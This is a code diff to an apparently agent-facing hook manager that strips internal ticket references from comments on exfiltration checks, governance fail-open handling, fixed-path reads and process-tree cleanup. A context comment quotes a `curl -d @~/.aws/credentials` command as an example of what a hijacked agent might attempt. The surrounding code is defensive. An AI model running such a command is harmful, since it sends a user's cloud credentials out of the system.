@@ -335,7 +335,7 @@ class HookManager:
             reason = is_sensitive_bash_command(target)
             if reason:
                 return ToolHookResult.deny(reason)
-            # Data-exfiltration / reverse-shell command shapes (Talos 5682f92b).
+            # Data-exfiltration / reverse-shell command shapes.
             # The anti-exfil patterns previously lived only in the passive audit
             # path (scan_history / dashboard count) and were never enforced at
             # invocation, so a hijacked agent could `curl -d @~/.aws/credentials
@@ -420,7 +420,7 @@ class HookManager:
 
         # Auto-approve — match against both the original title (preserves
         # "Running: "/"Reading " prefixes) and the normalized name (stripped)
-        # so that "Running: *" and "TaskeiGetTask" patterns both work.
+        # so that "Running: *" and bare tool-name patterns both work.
         for pattern in self._config.auto_approve_tools:
             if _tool_matches(pattern, tool_name) or _tool_matches(pattern, normalized):
                 return ToolHookResult.auto_approve()
@@ -474,7 +474,7 @@ def _governance_denial(
         # Wrap the late import + audit so a broken/renamed/partially-installed
         # governance_profiles cannot raise ImportError out of this except-branch
         # and convert the intended soft fail-open into a hard fail-closed that
-        # wedges every tool call (CR-284272012).
+        # wedges every tool call.
         try:
             from kiro_crew.platform.governance_profiles import audit_governance_degraded
 
@@ -822,7 +822,7 @@ def safe_read_prefix(raw: str, n: int) -> bytes | None:
 # why the read is system infrastructure (the bytes leaving the process never
 # reach an LLM/agent surface) rather than LLM/agent-mediated content.
 #
-# AUTOSDE `backend-security-controls` compliance: that rule requires reads of
+# The `backend-security-controls` rule requires reads of
 # "user- or LLM-influenced paths" to pass is_sensitive_path() and explicitly
 # EXEMPTS "trusted fixed-path internal ... reads". Every read_id here maps to a
 # HARDCODED constant path (never derived from user/LLM/config input), the read
@@ -1248,7 +1248,7 @@ async def run_script_hook(
         else:
             argv = ["/bin/sh", "-c", hook.command]
         wrapped_argv, cleanup_path = wrap_argv(argv)
-        wrapped_argv = cgroup_scope_argv(wrapped_argv)  # cgroup DoS ceiling (Talos bdf0d7e5)
+        wrapped_argv = cgroup_scope_argv(wrapped_argv)  # cgroup DoS ceiling
         # Process-group isolation for clean tree-kill on timeout. Pass both flags
         # explicitly (NOT **dict unpack — breaks mypy's Popen overload resolution
         # on the build fleet): start_new_session=True is a no-op on Windows,
@@ -1297,7 +1297,6 @@ async def run_script_hook(
                 # Async variant offloads the Windows taskkill spawn — the hook
                 # timeout path already runs on the event loop, so we never want
                 # to stall it further while taskkill.exe walks the tree
-                # (Mesh-2801).
                 await platform_compat.kill_process_tree_async(
                     proc.pid, platform_compat.SIGKILL
                 )
